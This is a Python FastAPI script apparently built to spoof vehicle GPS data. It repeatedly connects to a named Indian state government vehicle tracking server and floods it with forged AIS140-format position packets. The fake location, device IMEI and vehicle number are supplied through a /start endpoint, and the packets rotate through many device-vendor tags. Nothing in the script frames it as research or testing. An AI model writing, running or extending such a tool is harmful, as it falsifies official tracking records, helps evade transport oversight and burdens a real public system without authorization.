import socket
import threading
import time
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, BackgroundTasks
import firebase_admin
from firebase_admin import credentials, db

# --- CONFIG ---
TARGET_IP = "vlts.bihar.gov.in"
TARGET_PORT = 9999
TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

app = FastAPI()

# Firebase Setup (Initialize only once)
# Note: Render par 'serviceAccountKey.json' upload kar dena ya Env variables use karna
try:
    cred = credentials.Certificate("serviceAccountKey.json")
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'TERA_FIREBASE_URL_YAHAN_DALO'
    })
except Exception as e:
    print(f"Firebase Error: {e}")

firing = False

def format_coord(val):
    try:
        p = str(val).split('.')
        if len(p) == 1: return f"{p[0]}.0000000"
        return f"{p[0]}.{p[1][:7].ljust(7, '0')}"
    except: return val

def rapid_fire(tags_subset, imei, vno, lat, lon):
    global firing
    while firing:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0)
            s.settimeout(5)
            s.connect((TARGET_IP, TARGET_PORT))
            
            while firing:
                for tag in tags_subset:
                    now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                    dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
                    lt, ln = format_coord(lat), format_coord(lon)
                    
                    suffix = "e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041"
                    pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lt},N,{ln},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,{suffix},DDE3*\r\n"
                    
                    s.sendall(pkt.encode('ascii'))
                
                # Firebase Update (Log success)
                db.reference('/logs').push({
                    'timestamp': str(datetime.now()),
                    'status': 'Fired',
                    'vehicle': vno
                })
                time.sleep(0.01)
        except:
            time.sleep(0.1)
        finally:
            try: s.close()
            except: pass

@app.get("/")
def read_root():
    return {"Status": "Nitro V82 Online", "Mode": "Hyper Sonic"}

@app.get("/start")
def start_engine(background_tasks: BackgroundTasks, imei: str, vno: str, lat: str, lon: str):
    global firing
    if not firing:
        firing = True
        n = 4
        chunks = [TAG_LIST[i:i + n] for i in range(0, len(TAG_LIST), n)]
        for chunk in chunks:
            background_tasks.add_task(rapid_fire, chunk, imei, vno.upper(), lat, lon)
        return {"msg": "Engine Started"}
    return {"msg": "Already Running"}

@app.get("/stop")
def stop_engine():
    global firing
    firing = False
    return {"msg": "Engine Stopped"}
